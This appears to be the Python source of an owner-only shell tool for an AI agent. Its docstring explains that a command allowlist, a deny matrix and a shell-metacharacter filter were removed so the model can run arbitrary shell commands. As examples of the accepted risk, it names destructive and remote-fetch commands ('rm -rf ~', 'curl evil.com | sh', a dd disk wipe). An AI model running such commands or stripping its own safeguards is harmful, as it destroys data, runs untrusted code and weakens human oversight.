"""Owner-only full-shell exec tool.

User feedback 2026-05-21: "remove allowlist lets trust llm".

The previous version maintained a multi-layered safety net — an
`_ALLOWED_COMMANDS` whitelist of binary names, a per-command
`_SUBCOMMAND_ALLOW` / `_SUBCOMMAND_DENY` matrix (e.g. `git status`
ok / `git push` blocked), and a hard-deny of shell metacharacters
(no pipes, redirects, command substitution). Everything else
returned a structured refusal.

That was overkill for a single-tenant agent where the OWNER is
the only operator. The whitelist actively got in the way:
  - `rg --files` was fine, `find . -name '*.py' | head` was not
  - `ls -la /tmp/job/logs` ok, `tail -f` ok, `tail -F` ok, but
    `tail -F log | grep ERROR` blocked
  - `pip install foo` had to go through a separate ceremony (the
    install gate, dropped earlier the same day)

The only trust boundary now is `backend.roles.is_owner(speaker_id)`
on the tool-call wrapper. If you can hit `terminal_exec` at all,
you can run anything the agent's process user can run. Pipes,
redirects, command substitution, multi-command chains are all
allowed.

What's KEPT:
  - Owner-only gate (enforced by the tool registry wrapper, not
    here — this module trusts its caller)
  - Timeout (default 30s, cap 120s) — slow commands shouldn't
    stall the agent's tool loop indefinitely
  - Output cap (16 KB stdout + stderr combined) — keep prompt
    sizes sane on noisy commands

What's GONE:
  - `_ALLOWED_COMMANDS` whitelist
  - `_SUBCOMMAND_ALLOW` / `_SUBCOMMAND_DENY` matrices
  - `_SHELL_METACHARS` block
  - `shlex.split` parsing (we now pass the raw string to a real
    shell so the LLM can use the shell's parsing rules directly)

Risk acknowledged: the LLM can now `rm -rf ~`, `curl evil.com | sh`,
`dd if=/dev/zero of=/dev/sda`, etc. Mitigations beyond this module:
  - Reasoning routing — complex_solving / supervisor turns get
    `effort=high`, less likely to fire destructive commands by
    accident
  - Turn artifacts log every tool call + result for audit
  - The owner runs the agent under a non-root user account; sudo
    still prompts for password
  - Owner sets PATH / cwd / environment for the agent service
"""
from __future__ import annotations

import os
import subprocess
from dataclasses import dataclass


# Output cap (stdout + stderr combined). Anything past this is
# truncated and a marker appended so the LLM knows the body was cut.
MAX_OUTPUT_BYTES = 16 * 1024

DEFAULT_TIMEOUT_SECONDS = 30
MAX_TIMEOUT_SECONDS = 120


@dataclass(frozen=True)
class TerminalResult:
    ok: bool
    command: str
    exit_code: int       # -1 if the command didn't even start
    stdout: str
    stderr: str
    truncated: bool      # True if either stream was capped at MAX_OUTPUT_BYTES
    elapsed_ms: int
    error: str = ""      # human-readable reason for non-ok refusals


def _validate_command(raw: str) -> tuple[bool, str, list[str]]:
    """Pre-flight check. With the allowlist gone, the only thing
    we still refuse is an empty command.

    Returns `(ok, error_message, argv)`. `argv` is no longer
    strictly an argv — it's `[raw]` so the legacy callers that
    inspect `argv[0]` still get something useful. The actual
    execution goes through `shell=True` and ignores this list.
    """
    if not raw or not raw.strip():
        return False, "empty command", []
    return True, "", [raw]


def _truncate(stream: bytes, cap: int) -> tuple[str, bool]:
    """Decode bytes, cap to `cap` chars after decode, return (text, was_truncated)."""
    try:
        text = stream.decode("utf-8", errors="replace")
    except Exception:
        text = ""
    if len(text) <= cap:
        return text, False
    return text[:cap] + f"\n…[truncated {len(text) - cap} chars]", True


def run_terminal(
    command: str,
    *,
    timeout_seconds: int = DEFAULT_TIMEOUT_SECONDS,
    cwd: str | None = None,
) -> TerminalResult:
    """Run a shell command and return its result.

    The command runs through `/bin/sh -c <cmd>` (POSIX) or the
    platform shell on Windows. Pipes, redirects, command
    substitution, multi-command chains are all available — the
    shell parses them directly. Empty commands refuse with
    `ok=False`. Non-zero exit codes still produce a result with
    `ok=False` BUT `exit_code` set to the real code — the LLM
    distinguishes "didn't run" from "ran and failed" via `error`.

    `timeout_seconds` is clamped to [1, MAX_TIMEOUT_SECONDS].
    """
    import time as _time

    ok, err, _argv = _validate_command(command)
    if not ok:
        return TerminalResult(
            ok=False, command=command, exit_code=-1,
            stdout="", stderr="",
            truncated=False, elapsed_ms=0, error=err,
        )

    timeout = max(1, min(int(timeout_seconds or DEFAULT_TIMEOUT_SECONDS), MAX_TIMEOUT_SECONDS))
    start = _time.monotonic()
    try:
        proc = subprocess.run(
            command,
            cwd=cwd or None,
            capture_output=True,
            timeout=timeout,
            shell=True,
            check=False,
            env=os.environ.copy(),
        )
    except FileNotFoundError as e:
        elapsed = int((_time.monotonic() - start) * 1000)
        return TerminalResult(
            ok=False, command=command, exit_code=-1,
            stdout="", stderr="",
            truncated=False, elapsed_ms=elapsed,
            error=f"binary not found: {e}",
        )
    except subprocess.TimeoutExpired:
        elapsed = int((_time.monotonic() - start) * 1000)
        return TerminalResult(
            ok=False, command=command, exit_code=-1,
            stdout="", stderr="",
            truncated=False, elapsed_ms=elapsed,
            error=f"timed out after {timeout}s",
        )
    except PermissionError as e:
        elapsed = int((_time.monotonic() - start) * 1000)
        return TerminalResult(
            ok=False, command=command, exit_code=-1,
            stdout="", stderr="",
            truncated=False, elapsed_ms=elapsed,
            error=f"permission denied: {e}",
        )

    elapsed = int((_time.monotonic() - start) * 1000)
    # Split the output cap between stdout and stderr so a noisy
    # stderr can't starve stdout (or vice versa). 2/3 to stdout
    # because that's where the actual content normally lives.
    stdout_cap = (MAX_OUTPUT_BYTES * 2) // 3
    stderr_cap = MAX_OUTPUT_BYTES - stdout_cap
    out, out_trunc = _truncate(proc.stdout or b"", stdout_cap)
    err_text, err_trunc = _truncate(proc.stderr or b"", stderr_cap)
    return TerminalResult(
        ok=(proc.returncode == 0),
        command=command,
        exit_code=int(proc.returncode),
        stdout=out,
        stderr=err_text,
        truncated=(out_trunc or err_trunc),
        elapsed_ms=elapsed,
        error="" if proc.returncode == 0 else f"exit code {proc.returncode}",
    )
